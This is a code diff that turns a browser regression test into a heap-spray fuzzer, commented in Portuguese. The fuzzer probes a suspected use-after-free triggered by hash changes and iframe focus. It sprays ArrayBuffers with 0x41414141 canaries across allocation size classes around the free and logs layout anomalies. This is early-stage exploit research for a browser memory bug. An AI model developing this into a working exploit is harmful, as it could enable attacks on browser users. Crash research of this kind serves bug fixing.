@@ -1,25 +1,99 @@
-<!DOCTYPE html>
-<html>
-<head>
+<style>
+  iframe {
+    content: url();
+    zoom: 0.01;
+  }
+</style>
 <script>
-function runTest() {
-    
-    iframe.contentWindow.onpagehide = () => {
-        document.execCommand("indent", false);
-        document.execCommand("selectAll", false);
+  // ── Estado do fuzzer (fora do onload, igual às vars globais do original) ──
+  let ciclo = 0;
+  const MAX_CICLOS = 150;
+  const SIZE_CLASSES = [0x100, 0x140, 0x180, 0x1c0, 0x200, 0x240, 0x280];
+  let _spray = null;
+  const anomalias = [];
+
+  function fazerSpray(sz) {
+    _spray = null;                          // solta anterior → GC → slot livre
+    const buf = [];
+    for (let i = 0; i < 512; i++) {
+      const ab = new ArrayBuffer(sz);
+      new Uint32Array(ab).fill(0x41414141); // canário detectável se lido como ptr
+      buf.push(ab);
+    }
+    _spray = buf;                           // mantém vivo até próxima chamada
+  }
+
+  function checar(tag, sz) {
+    try {
+      const r = i0.getBoundingClientRect();
+      if (r.width === 0 && r.height === 0)
+        registrar(tag, 'geometry-zero', sz);
+    } catch(e) { registrar(tag, 'BoundingRect:' + e.message, sz); }
+
+    try { void document.documentElement.offsetHeight; }
+    catch(e) { registrar(tag, 'offsetHeight:' + e.message, sz); }
+
+    try {
+      const rng = document.createRange();
+      rng.selectNode(i0);
+      rng.getClientRects();
+      rng.detach();
+    } catch(e) { registrar(tag, 'Range:' + e.message, sz); }
+  }
+
+  function registrar(tag, tipo, sz) {
+    const e = { ciclo, sz: '0x' + sz.toString(16), tag, tipo };
+    anomalias.push(e);
+    console.log('[!] ANOMALIA ' + JSON.stringify(e));
+  }
+
+  function relatorio() {
+    console.log('[FUZZER] ciclos=' + ciclo + ' anomalias=' + anomalias.length);
+    if (anomalias.length > 0) {
+      const freq = {};
+      anomalias.forEach(a => { freq[a.sz] = (freq[a.sz] || 0) + 1; });
+      const top = Object.entries(freq).sort((a, b) => b[1] - a[1])[0];
+      console.log('[FUZZER] size class candidata: ' + top[0] +
+                  ' (' + top[1] + ' anomalias)');
+      console.log('[FUZZER] detalhe: ' + JSON.stringify(anomalias));
+    } else {
+      console.log('[FUZZER] sem anomalia JS — UAF ocorre em nivel C++ puro');
+      console.log('[FUZZER] proximo passo: Remote Inspector durante as iteracoes');
+    }
+  }
+
+  // ── Idêntico ao seu teste — só onfocus recebe o fuzzer ──────────────────
+  onload = () => {
+    document.documentElement.append(document.createElement('frameset'));
+
+    i0.onfocus = () => {
+      if (ciclo >= MAX_CICLOS) {
+        i0.onfocus = null;
+        relatorio();
+        return;
+      }
+
+      const sz = SIZE_CLASSES[ciclo % SIZE_CLASSES.length];
+
+      fazerSpray(sz);         // pré-hash: ocupa slot antes do free()
+      checar('pre', sz);
+
+      location.hash = 'y';   // ← intacto — mantém o loop
+
+      fazerSpray(sz);         // pós-hash: ocupa slot após o free()
+      checar('post', sz);
+
+      if (ciclo % 10 === 0)
+        console.log('[FUZZER] ciclo=' + ciclo +
+                    ' sz=0x' + sz.toString(16));
+      ciclo++;
     };
-    document.execCommand("selectAll", false);
-    document.execCommand("outdent", false);
-}
+
+    location.hash = 'x';     // ← intacto
+
+    let s0 = document.createElement('script');
+    s0.src = `data:text/javascript,caches.has('a').then(() => i0.focus());`;
+    document.head.append(s0);
+  };
 </script>
-</head>
-<body onload="runTest()" contenteditable>
-    This tests that we do not crash while outdenting paragraphs.
-    PASS
-    <ol>
-        <li>
-            <iframe id="iframe"></iframe>
-        </li>
-    </ol>
-</body>
-</html>
+<iframe id="i0"></iframe>
